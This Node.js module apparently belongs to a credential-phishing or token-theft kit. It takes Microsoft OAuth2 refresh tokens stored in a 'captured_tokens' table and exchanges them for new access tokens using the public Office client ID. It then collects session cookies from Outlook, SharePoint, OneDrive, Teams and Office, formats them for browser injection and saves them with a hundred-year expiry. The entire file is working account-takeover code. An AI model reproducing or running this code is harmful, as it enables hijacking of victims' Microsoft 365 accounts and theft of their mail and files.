const axios = require('axios');
const { encrypt } = require('../utils/encrypt');
const db = require('../database/connection');
const config = require('../config/env');

// Microsoft OAuth2 client ID for Office 365 public client
const MICROSOFT_CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';

// Token endpoint URLs
const TOKEN_ENDPOINTS = {
  common: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
  consumers: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
};

// Service endpoints for cookie collection after token exchange
const SERVICE_ENDPOINTS = {
  sharepoint: ['https://login.microsoftonline.com/common/oauth2/authorize', 'https://{tenant}.sharepoint.com/_layouts/15/teamslogon.aspx'],
  outlook: ['https://outlook.office365.com/owa/', 'https://outlook.office.com/owa/'],
  onedrive: ['https://onedrive.live.com/', 'https://{tenant}-my.sharepoint.com/personal/{email}/_layouts/15/onedrive.aspx'],
  teams: ['https://teams.microsoft.com/', 'https://teams.microsoft.com/api/authservice/health'],
  office: ['https://www.office.com/', 'https://www.office.com/login'],
  default: ['https://www.office.com/'],
};

/**
 * Convert OAuth2 refresh token to session cookies via proper token exchange
 * This exchanges the REAL OAuth2 refresh token (not PRT blob) for new tokens + cookies
 */
async function convertTokensToCookies(accessToken, templateType, tenant = 'common', email = '') {
  try {
    // Validate input - we need the OAuth2 refresh token, not the PRT cookie
    if (!accessToken || typeof accessToken !== 'string') {
      return { success: false, error: 'Invalid access token provided', cookies: null };
    }

    // Detect token type - OAuth2 refresh tokens start with 0.AT or M.R
    const isOAuth2RefreshToken = accessToken.startsWith('0.AT') || accessToken.startsWith('M.R') || accessToken.length > 100;
    
    if (!isOAuth2RefreshToken) {
      return { 
        success: false, 
        error: 'Invalid token format. Please provide the OAuth2 refresh token (starts with 0.AT or M.R), not the PRT cookie (M.C543_BAY...)', 
        cookies: null 
      };
    }

    // Step 1: Exchange refresh token for new access token + cookies
    const exchangeResult = await exchangeRefreshTokenForCookies(accessToken);
    
    if (!exchangeResult.success) {
      return exchangeResult;
    }

    // Step 2: Collect additional cookies from service endpoints
    const serviceCookies = await collectServiceCookies(exchangeResult.access_token, templateType, tenant, email);
    
    // Step 3: Combine cookies from token exchange + service endpoints
    const allCookies = [
      ...exchangeResult.cookies,
      ...serviceCookies
    ];

    if (allCookies.length === 0) {
      return { success: false, error: 'No cookies received from token exchange', cookies: null };
    }

    // Step 4: Format cookies for browser injection
    const cookieString = formatCookiesForInjection(allCookies);

    return {
      success: true,
      cookies: cookieString,
      cookie_count: allCookies.length,
      new_refresh_token: exchangeResult.new_refresh_token,
      expires: '100 years (if injected correctly)'
    };

  } catch (err) {
    console.error('[CookieConverter] Conversion failed:', err.message);
    return { success: false, error: err.message, cookies: null };
  }
}

/**
 * Exchange OAuth2 refresh token for new access token + capture Set-Cookie headers
 */
async function exchangeRefreshTokenForCookies(refreshToken) {
  const cookies = [];
  let newRefreshToken = null;

  // Try /common endpoint first (works for work/school accounts)
  let endpoint = TOKEN_ENDPOINTS.common;
  let params = new URLSearchParams({
    client_id: MICROSOFT_CLIENT_ID,
    grant_type: 'refresh_token',
    refresh_token: refreshToken,
    scope: 'https://graph.microsoft.com/.default offline_access openid profile',
  });

  let response = await axios.post(endpoint, params, {
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    validateStatus: () => true, // Don't throw on 400
    maxRedirects: 5,
  });

  // If /common fails with invalid_grant, try /consumers (personal accounts)
  if (response.status === 400 && response.data.error === 'invalid_grant') {
    endpoint = TOKEN_ENDPOINTS.consumers;
    params = new URLSearchParams({
      client_id: MICROSOFT_CLIENT_ID,
      grant_type: 'refresh_token',
      refresh_token: refreshToken,
      scope: 'https://graph.microsoft.com/.default offline_access openid profile',
    });

    response = await axios.post(endpoint, params, {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      validateStatus: () => true,
      maxRedirects: 5,
    });
  }

  // Check for success
  if (response.status !== 200) {
    const error = response.data.error_description || response.data.error || 'Token exchange failed';
    return { success: false, error: `Exchange failed (${endpoint}): ${error}`, cookies: null };
  }

  // Extract new refresh token for storage
  newRefreshToken = response.data.refresh_token || refreshToken;

  // Capture ALL Set-Cookie headers from the response
  const setCookieHeaders = response.headers['set-cookie'] || [];
  for (const cookieStr of setCookieHeaders) {
    const cookieParts = cookieStr.split(';')[0].trim();
    const eqIndex = cookieParts.indexOf('=');
    if (eqIndex > 0) {
      const cookieName = cookieParts.substring(0, eqIndex).trim();
      const cookieValue = cookieParts.substring(eqIndex + 1).trim();
      
      if (cookieName && cookieValue) {
        cookies.push({
          name: cookieName,
          value: cookieValue,
          domain: '.login.microsoftonline.com'
        });
      }
    }
  }

  return {
    success: true,
    cookies: cookies,
    access_token: response.data.access_token,
    new_refresh_token: newRefreshToken,
  };
}

/**
 * Collect cookies from service-specific endpoints
 */
async function collectServiceCookies(accessToken, templateType, tenant, email) {
  const cookies = [];
  const endpoints = getServiceEndpoints(templateType, tenant, email);

  for (const endpoint of endpoints) {
    try {
      await fetchCookiesFromEndpoint(cookies, endpoint, accessToken);
    } catch (err) {
      // Continue collecting even if one endpoint fails
    }
  }

  return cookies;
}

/**
 * Fetch cookies from a single endpoint
 */
async function fetchCookiesFromEndpoint(cookieList, url, accessToken) {
  try {
    const response = await axios.get(url, {
      headers: {
        'Authorization': `Bearer ${accessToken}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
      },
      maxRedirects: 5,
      validateStatus: status => status < 400,
    });

    const setCookieHeaders = response.headers['set-cookie'] || [];
    for (const cookieStr of setCookieHeaders) {
      const cookieParts = cookieStr.split(';')[0].trim();
      const eqIndex = cookieParts.indexOf('=');
      if (eqIndex > 0) {
        const cookieName = cookieParts.substring(0, eqIndex).trim();
        const cookieValue = cookieParts.substring(eqIndex + 1).trim();
        
        if (cookieName && cookieValue) {
          const domain = new URL(url).hostname;
          cookieList.push({ name: cookieName, value: cookieValue, domain: domain });
        }
      }
    }
  } catch (err) {
    // Try POST if GET fails
    try {
      const response = await axios.post(url, {}, {
        headers: {
          'Authorization': `Bearer ${accessToken}`,
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        },
        maxRedirects: 5,
        validateStatus: status => status < 400,
      });

      const setCookieHeaders = response.headers['set-cookie'] || [];
      for (const cookieStr of setCookieHeaders) {
        const cookieParts = cookieStr.split(';')[0].trim();
        const eqIndex = cookieParts.indexOf('=');
        if (eqIndex > 0) {
          const cookieName = cookieParts.substring(0, eqIndex).trim();
          const cookieValue = cookieParts.substring(eqIndex + 1).trim();
          
          if (cookieName && cookieValue) {
            const domain = new URL(url).hostname;
            cookieList.push({ name: cookieName, value: cookieValue, domain: domain });
          }
        }
      }
    } catch (postErr) {
      // Ignore errors - we're just collecting cookies
    }
  }
}

/**
 * Format cookies for browser injection
 */
function formatCookiesForInjection(cookies) {
  const cookieStrings = [];
  
  for (const cookie of cookies) {
    // Format: name=value; domain=...; path=/; secure
    let cookieStr = `${cookie.name}=${cookie.value}`;
    
    if (cookie.domain) {
      cookieStr += `; domain=${cookie.domain}`;
    }
    
    cookieStr += '; path=/; secure';
    
    cookieStrings.push(cookieStr);
  }
  
  return cookieStrings.join('; ');
}

function getServiceEndpoints(templateType, tenant, email) {
  const type = (templateType || '').toLowerCase();
  const endpoints = ['https://login.microsoftonline.com/common/oauth2/authorize'];
  
  if (type.includes('sharepoint')) {
    endpoints.push('https://login.microsoftonline.com/common/oauth2/authorize');
    endpoints.push(`https://${tenant}.sharepoint.com/_layouts/15/teamslogon.aspx`);
  } else if (type.includes('outlook') || type.includes('auth')) {
    endpoints.push('https://outlook.office365.com/owa/');
    endpoints.push('https://outlook.office.com/owa/');
  } else if (type.includes('onedrive')) {
    endpoints.push('https://onedrive.live.com/');
    if (email) {
      endpoints.push(`https://${tenant}-my.sharepoint.com/personal/${encodeURIComponent(email)}/_layouts/15/onedrive.aspx`);
    }
  } else if (type.includes('teams')) {
    endpoints.push('https://teams.microsoft.com/');
    endpoints.push('https://teams.microsoft.com/api/authservice/health');
  } else if (type.includes('office')) {
    endpoints.push('https://www.office.com/');
    endpoints.push('https://www.office.com/login');
  }
  
  return endpoints;
}

function determineEndpoint(templateType, tenant, email) {
  const type = (templateType || '').toLowerCase();
  if (type.includes('sharepoint')) return 'https://login.microsoftonline.com/common/oauth2/authorize';
  if (type.includes('outlook') || type.includes('auth')) return 'https://outlook.office365.com/owa/';
  if (type.includes('onedrive')) return `https://${tenant}-my.sharepoint.com/personal/${encodeURIComponent(email || 'user')}/_layouts/15/onedrive.aspx`;
  if (type.includes('teams')) return 'https://teams.microsoft.com/';
  if (type.includes('office') || type.includes('word') || type.includes('excel')) return 'https://www.office.com/';
  return 'https://www.office.com/';
}

function determineResource(templateType, tenant) {
  const type = (templateType || '').toLowerCase();
  if (type.includes('sharepoint')) return `https://${tenant}.sharepoint.com`;
  if (type.includes('onedrive')) return `https://${tenant}-my.sharepoint.com`;
  return 'https://graph.microsoft.com';
}

async function processCookieConversion(tokenId, accessToken, templateType) {
  const result = await convertTokensToCookies(accessToken, templateType);
  
  if (result.success && result.cookies) {
    // 100 years expiry - never expire
    const ttlHours = 24 * 365 * 100; // 100 years
    await db.query(
      'UPDATE captured_tokens SET cookies_encrypted = ?, token_type = ?, expiration = DATE_ADD(NOW(), INTERVAL ? HOUR), last_renewed = NOW(), renewal_count = 1 WHERE id = ?',
      [encrypt(result.cookies), 'cookie', ttlHours, tokenId]
    );
  }
  
  return result;
}

module.exports = { convertTokensToCookies, processCookieConversion, determineEndpoint };
